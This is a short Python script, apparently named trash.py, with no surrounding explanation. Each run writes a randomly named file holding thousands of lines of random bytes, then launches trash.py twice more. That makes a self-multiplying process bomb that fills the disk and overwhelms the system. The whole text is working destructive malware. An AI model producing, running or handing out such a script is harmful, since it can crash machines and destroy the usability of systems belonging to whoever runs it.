import os
import random
f = open("PyShit" + str(random.randint(0,100000)) + ".txt", "w")
for i in range(0,10000):
    trash = os.urandom(3000)
    f.write("{}\n".format(str(trash)))
f.close()
os.startfile(r'trash.py')
os.startfile(r'trash.py')
